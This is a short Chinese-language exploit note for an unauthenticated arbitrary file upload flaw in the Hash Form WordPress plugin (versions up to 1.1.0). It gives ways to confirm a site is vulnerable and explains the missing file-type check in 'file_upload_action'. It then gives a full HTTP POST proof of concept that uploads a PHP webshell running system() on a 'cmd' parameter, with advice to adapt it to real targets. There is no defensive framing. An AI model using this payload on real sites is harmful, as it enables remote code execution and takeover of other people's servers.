验证漏洞存在方法
    - 检查目标网站是否使用了Hash Form插件（版本<=1.1.0）
    - 访问目标网站并查看源代码中是否包含hash-form相关的脚本或样式
    - 检查WordPress插件目录中是否存在hash-form文件夹

漏洞利用方法
    - 该漏洞存在于Hash Form插件的'file_upload_action'函数中，由于缺少文件类型验证，未经身份验证的攻击者可以上传任意文件
    - 攻击者可以通过构造恶意请求上传webshell或其他恶意文件到目标服务器
    - 上传的文件可能位于WordPress的上传目录或插件相关目录中
    - 成功上传webshell后，攻击者可以执行任意代码，获取服务器控制权

PoC示例：
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="action"

file_upload_action
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

<?php
// Webshell代码
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

注意：实际利用时可能需要根据目标网站的具体配置调整请求参数和路径。此漏洞影响Hash Form插件所有版本<=1.1.0，CVSS评分为9.8（CRITICAL）。
